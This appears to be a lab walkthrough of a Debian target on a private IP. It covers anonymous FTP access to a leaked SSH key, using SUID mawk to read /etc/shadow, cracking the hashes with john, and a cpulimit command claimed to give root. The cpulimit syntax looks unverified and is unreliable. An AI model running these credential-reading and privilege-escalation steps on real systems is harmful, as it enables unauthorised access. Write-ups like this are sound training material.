## Target Info
- **IP:** 192.168.191.130  
- **OS/Tech:** Debian 10, vsFTPd 3.0.3, OpenSSH 7.9p1, ZoneMinder-like service

---

## Credentials
- **User:** `hannah` (via SSH key)  
- **Password:** _(none)_

---

## Service Enumeration (`nmap -sC -sV`)

| Port     | State | Service | Version                                         |
|----------|-------|---------|-------------------------------------------------|
| **21**   | open  | ftp     | vsftpd 3.0.3 – anonymous login allowed          |
| **61000**| open  | ssh     | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  |

---

## Initial Access via FTP

1. **Anonymous FTP login**  
   ```bash
   ftp 192.168.191.130 21
   # Login as “anonymous” → success
   ```

2. **List & navigate**  
   ```bash
   ftp> ls -lsa
   229 Entering Extended Passive Mode ...
   drwxr-xr-x    2 0        0       4096 Aug 06  2020 .hannah
   ftp> cd .hannah
   ftp> ls
   -rwxr-xr-x    1 0        0       1823 Aug 06  2020 id_rsa
   ```

3. **Download SSH key**  
   ```bash
   ftp> get id_rsa
   ```

---

## SSH as `hannah`

1. **Adjust key permissions**  
   ```bash
   chmod 600 id_rsa
   ```

2. **Connect on port 61000**  
   ```bash
   ssh -i id_rsa hannah@192.168.191.130 -p 61000
   # Logged in as hannah
   ```
---

## Privilege Escalation

### 1. Enumerate SUID/SGID binaries
```bash
# SUIDs
find / -perm -u=s -type f 2>/dev/null
# …/usr/bin/mawk  # suspicious
# SGIDs
find / -perm -g=s -type f 2>/dev/null
```

### 2. Exploit `mawk` for file read (GTFOBins)
```bash
mawk '//' /etc/shadow | grep -E '^(root|hannah)'
# Displays salted SHA-512 hashes
```

3. **Crack hashes**  
   ```bash
   unshadow passwd shadow > crackme
   john crackme --wordlist=/usr/share/wordlists/rockyou.txt
   # no success
   ```

### 3. Exploit `cpulimit` (GTFOBins)
```bash
# Use cpulimit to spawn a root shell
cpulimit --path /bin/sh --signal SIGTERM --limit 100
# or the one-liner from GTFOBins for cpulimit
```
